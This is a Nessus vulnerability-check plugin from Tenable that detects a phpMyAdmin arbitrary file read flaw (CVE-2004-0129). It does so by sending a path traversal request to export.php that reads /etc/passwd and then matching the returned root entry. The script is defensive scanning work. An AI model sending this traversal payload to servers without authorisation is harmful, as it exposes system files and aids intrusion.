#
# (C) Tenable Network Security
#

if(description)
{
 script_id(12041);
 script_cve_id("CVE-2004-0129");
 script_bugtraq_id(9564);
 if (defined_func("script_xref")) {
  script_xref(name:"OSVDB", value:"3800");
 }
 script_version ("$Revision: 1.6 $");
 
 name["english"] = "phpMyAdmin arbitrary file reading (2)";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running phpMyAdmin - a web based MySQL administration
tool.

There is a bug in this software which may allow an attacker to read 
arbitary files on the remote web server with the privileges of the
web user.

Solution : Upgrade to the latest version of phpMyAdmin or disable this software
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks phpMyAdmin";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 - 2005 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "phpMyAdmin_detect.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/phpMyAdmin"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];

    req = string(dir,"/export.php??what=../../../../../../../../../../etc/passwd%00");
    req = http_get(item:req, port:port);
    buf = http_keepalive_send_recv(port:port, data:req);
    if( buf == NULL ) exit(0);

    if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
 	security_hole(port);
	exit(0);
    }
  }
}
